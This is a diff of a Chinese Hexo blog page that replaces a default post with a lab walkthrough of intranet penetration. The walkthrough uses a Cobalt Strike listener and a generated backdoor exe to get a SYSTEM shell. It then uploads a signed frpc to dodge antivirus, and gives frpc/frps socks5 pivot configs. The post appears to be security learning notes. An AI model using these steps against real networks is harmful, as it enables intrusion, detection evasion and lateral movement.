@@ -16,18 +16,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" content="#f8f8f8">
   
-  <title>HelloWorld - Cber</title>
+  <title>Frp内网渗透 - Cber</title>
 
   
-    <meta name="description" content="总字符数: 0.78K                代码: 0.09K, 文本: 0.11K               预计阅读时间: 1 分钟            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems whe">
+    <meta name="description" content="总字符数: 2.68K                代码: 0.30K, 文本: 0.97K               预计阅读时间: 5 分钟            内网穿透（Port Forwarding）是将公网上的IP地址映射到内部网络中的一台计算机的某个端口上，以便外部网络可以访问该计算机中运行的应用程序。 本次测试frp所使用的工具Frpc frp的原理如下：1.客户端向">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HelloWorld">
-<meta property="og:url" content="https://axusun01.github.io/2023/07/13/d9d69390/index.html">
+<meta property="og:title" content="Frp内网渗透">
+<meta property="og:url" content="https://axusun01.github.io/2024/07/05/d9d69100/index.html">
 <meta property="og:site_name" content="Cber">
-<meta property="og:description" content="总字符数: 0.78K                代码: 0.09K, 文本: 0.11K               预计阅读时间: 1 分钟            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems whe">
+<meta property="og:description" content="总字符数: 2.68K                代码: 0.30K, 文本: 0.97K               预计阅读时间: 5 分钟            内网穿透（Port Forwarding）是将公网上的IP地址映射到内部网络中的一台计算机的某个端口上，以便外部网络可以访问该计算机中运行的应用程序。 本次测试frp所使用的工具Frpc frp的原理如下：1.客户端向">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-07-13T02:00:47.000Z">
-<meta property="article:modified_time" content="2024-07-05T07:21:40.965Z">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051933510.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051934407.png">
+<meta property="og:image" content="e:\BlogFile\source_posts\Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets\image-20240704172236184.png">
+<meta property="og:image" content="e:\BlogFile\source_posts\Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets\image-20240704172241853.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935256.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935368.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935787.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935150.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936316.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936368.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936264.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936639.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936134.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936061.png">
+<meta property="og:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936976.png">
+<meta property="article:published_time" content="2024-07-05T02:00:52.000Z">
+<meta property="article:modified_time" content="2024-07-05T12:16:42.197Z">
 <meta property="article:author" content="Cber">
 <meta property="article:tag" content="蓝队">
 <meta property="article:tag" content="攻防演练">
@@ -35,6 +50,7 @@
 <meta property="article:tag" content="应急响应">
 <meta property="article:tag" content="安全运营">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051933510.png">
   
   
   
@@ -81,43 +97,68 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/2023/07/13/d9d69390/">HelloWorld</a>
+  <a class="cap breadcrumb" href="/2024/07/05/d9d69100/">Frp内网渗透</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-07-13T02:00:47.000Z">2023-07-13</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-05T07:21:40.965Z">2024-07-05</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-05T02:00:52.000Z">2024-07-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-05T12:16:42.197Z">2024-07-05</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>HelloWorld</span></h1>
+        <h1 class="text title"><span>Frp内网渗透</span></h1>
         
       </div>
     </div>
     
   </div>
   </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
-    <p>总字符数: 0.78K </p>
+    <p>总字符数: 2.68K </p>
     </div>
     <div class="cell" style="">
-    <p>代码: 0.09K, 文本: 0.11K</p>
+    <p>代码: 0.30K, 文本: 0.97K</p>
     </div>
     <div class="cell" style="">
-    <p>预计阅读时间: 1 分钟</p>
+    <p>预计阅读时间: 5 分钟</p>
     </div>
     </div>
 
-<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>内网穿透（Port Forwarding）是将公网上的IP地址映射到内部网络中的一台计算机的某个端口上，以便外部网络可以访问该计算机中运行的应用程序。</p>
+<p>本次测试frp所使用的工具<br>Frpc</p>
+<p>frp的原理如下：<br>1.客户端向frp服务器发送请求。当客户端启动时，它会向frp服务器发送一条请求，请求服务器分配一个唯一的客户端ID。<br>2.服务器返回分配的客户端ID。frp服务器将分配一个唯一的客户端ID，并将其返回给客户端。<br>3.客户端连接到服务器。客户端使用分配的客户端ID连接到frp服务器，以便服务器可以知道客户端要连接的计算机和端口。<br>4.服务器将请求转发到客户端。当外部网络发出请求时，frp服务器将请求转发到客户端，客户端将请求转发到指定的计算机和端口上。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051933510.png" alt="image-20240704172213348"></p>
+<p>本机cs连接测试内网穿透<br>服务端：kali    192.168.52.128    密码123456<br>客户端：win10    192.168.52.132</p>
+<p>kali操作：<br>cd &#x2F;home&#x2F;axu&#x2F;cs4.4<br>.&#x2F;teamserver 192.168.52.128 123456注意这个端口，启动cs的时候需要</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051934407.png" alt="image-20240704172230244"></p>
+<p>.&#x2F;cobaltstrike</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="E:\BlogFile\source_posts\Frp内网穿透.assets\image-20240704172236184.png" alt="image-20240704172236184"></p>
+<p>ip即kali服务器ip</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="E:\BlogFile\source_posts\Frp内网穿透.assets\image-20240704172241853.png" alt="image-20240704172241853"></p>
+<p>进入到cs界面</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935256.png" alt="image-20240704172249424"></p>
+<p>添加一个监听，HTTP Host为kali服务器ip，端口6666，payload这里选择HTTP</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935368.png" alt="image-20240704172255342"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935787.png" alt="image-20240704172304982"></p>
+<p>选择生成后门-</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935150.png" alt="image-20240704172316298"></p>
+<p>选择创建的监听器，生成下载到kali机器 cd &#x2F;root&#x2F;xu.exe</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936316.png" alt="image-20240704172321675"></p>
+<p>因为是本机测试，将xu.exe直接copy到win10目标机，双击运行<br>可看到已经成功获得对方的shell，目标机器已上线</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936368.png" alt="image-20240704172329497"></p>
+<p>提权</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936264.png" alt="image-20240704172334839"></p>
+<p>权限已提升为system*</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936639.png" alt="image-20240704172339801"></p>
+<p>接下来重点<br>目标机上传frpc.exe和frpc.ini<br>上传的frpc.exe应该是带签名的0.34.1的Frpc.exe，如若是裸frp落地火绒会直接杀的<br>（印象中MID目标机frpc连接超时，而另一台目标机可以连接成功的原因是另一台目标机用的是0.45版本的Erfrp代理工具并且frpc与frps版本相对应）<br>由于之前实战中目标机器运行frpc不成功总结一下原因<br>1.frpc与frps版本不一致<br>windows查看文件命令<br>2.frpc.ini与frps.ini的token配置不一致（连接超时错误）<br>3.frpc.ini配置server_addr &#x3D; ip地址与服务器地址不一致</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936134.png" alt="image-20240704172348154"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.52.128</span><br><span class="line">server_port = 7000</span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6500</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = axu</span><br><span class="line">plugin_passwd = axu123456</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = axu</span><br><span class="line">dashboard_pwd = axu123321</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>[mid_socks5] 可能更偏向于某个软件或系统内部的中间层代理功能，而 [plugin_socks5] 则可能更偏向于某个软件或系统的插件系统中的代理功能扩展。</p>
+<p>版本，配置文件对应后<br>shell Frpc -c frpc.ini连接成功</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936061.png" alt="image-20240704172459599"></p>
+<p>SocksCap64测试代理服务器成功</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936976.png" alt="image-20240704172504199"></p>
+<p>完成之后，切记删除上传的frpc.ini文件，kill杀掉Frpc.exe进程，如果是本机测试的话，维权的文件也删除，sleep 10</p>
 </article>
 
   <div class="related-wrap md-text" id="comments">
